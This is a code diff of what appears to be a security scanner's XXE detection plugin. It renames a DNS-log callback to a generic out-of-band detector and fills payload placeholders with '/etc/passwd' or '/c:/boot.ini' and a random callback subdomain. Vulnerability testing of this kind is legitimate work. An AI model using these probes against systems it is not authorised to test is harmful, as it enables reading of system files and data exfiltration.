@@ -19,10 +19,10 @@ def run(probe_ins: Probe) -> None:
         
     vulnerable = False
     try:
-        dnslog_domain = f"{get_random_str(6)}.{probe_ins.dnslog.domain}"
+        domain = f"{get_random_str(6)}.{probe_ins.oob_detector.domain}"
         for payload in probe_ins.probes_payload['xxe']:
             # 将 payload 中的占位符 filepath 和 dnslog 分别替换为平台特定文件和 dnslog 子域名
-            payload = payload.replace('dnslog', dnslog_domain) \
+            payload = payload.replace('domain', domain) \
                 .replace('filepath', '/c:/boot.ini' if os.environ['platform'] == 'windows' else '/etc/passwd')
 
             payload_request = probe_ins.gen_payload_request('&xxe;')
@@ -41,8 +41,8 @@ def run(probe_ins: Probe) -> None:
                 _ = send_request(payload_request)
                 time.sleep(random.random())
 
-                dnslog_records = probe_ins.dnslog.pull_logs(dnslog_domain[:-3])
-                if dnslog_records and dnslog_domain in str(dnslog_records):
+                records = probe_ins.oob_detector.pull_logs(domain[:6])
+                if records and domain in str(records):
                     vulnerable = True
 
             if vulnerable:
